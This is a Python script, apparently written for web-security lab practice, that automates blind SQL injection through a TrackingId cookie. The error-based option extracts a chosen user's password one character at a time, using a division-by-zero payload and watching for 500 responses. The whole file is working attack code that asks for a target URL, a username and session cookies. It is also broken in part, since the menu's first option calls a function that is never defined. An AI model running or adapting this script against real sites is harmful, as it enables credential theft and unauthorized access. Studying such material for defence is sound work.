import sys
import requests
import urllib3
import urllib.parse
import threading
from concurrent.futures import ThreadPoolExecutor

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Proxies configuration
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def blind_sqli_with_error_response(url, username, base_trackingid, session_cookie):
    """This function is for Blind SQLi where a correct guess causes a 500 error."""
    password_extracted = ""
    print("Extracting password... (Error-Based)")
    
    for i in range(1, 21):  # Assuming password length up to 20 characters
        found_char_for_pos = False
        for j in range(32, 127):  # ASCII range for printable characters
            
            # THE FIX IS HERE: Check if the character is a single quote and escape it properly for the SQL query
            char_to_test = "''" if chr(j) == "'" else chr(j)

            # This payload causes a division-by-zero error if the character guess is correct
            sqli_payload = f"' || (SELECT CASE WHEN (SUBSTR(password,{i},1)='{char_to_test}') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='{username}') || '"
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            
            cookies = {
                'TrackingId': base_trackingid + sqli_payload_encoded,
                'session': session_cookie
            }
            
            try:
                # A timeout is critical for robust networking code
                r = requests.get(url, cookies=cookies, verify=False, proxies=proxies, timeout=10)
                
                # Update the display to show current progress
                sys.stdout.write(f'\r{password_extracted}{chr(j)}')
                sys.stdout.flush()

                if r.status_code == 500:  # 500 Internal Server Error means our guess was correct
                    password_extracted += chr(j)
                    sys.stdout.write(f'\r{password_extracted}')
                    sys.stdout.flush()
                    found_char_for_pos = True
                    break # Move to the next character position
            
            except requests.exceptions.RequestException as e:
                print(f"\nAn error occurred: {e}")
                
        if not found_char_for_pos:
            print("\nCould not determine character for this position. Exiting.")
            break

    print(f"\n\nExtraction complete. Password: {password_extracted}")


def main():
    print("=====================================")
    print("     Welcome to SQL Injector        ")
    print("                          @d4rkd3vil")
    print("=====================================")
    print("Select an option:")
    print("1. Blind SQLi (Conditional Response - e.g., 'Welcome' message)")
    print("2. Blind SQLi (Error-Based - e.g., 500 status code)")
    
    choice = input("Enter your choice (1/2): ")
    
    if choice == '1':
        print("\nRunning Blind SQLi (Conditional Response)...")
        url = input("Enter the URL: ")
        username = input("Enter the username to target (e.g., administrator): ")
        base_trackingid = input("Enter the base TrackingId cookie value: ")
        session_cookie = input("Enter the session cookie value: ")
        blind_sqli_conditional(url, username, base_trackingid, session_cookie)
    elif choice == '2':
        print("\nRunning Blind SQLi (Error-Based)...")
        url = input("Enter the URL: ")
        username = input("Enter the username to target (e.g., administrator): ")
        base_trackingid = input("Enter the base TrackingId cookie value: ")
        session_cookie = input("Enter the session cookie value: ")
        blind_sqli_with_error_response(url, username, base_trackingid, session_cookie)
    else:
        print("Invalid choice. Please run the program again and select 1 or 2.")

if __name__ == "__main__":
    main()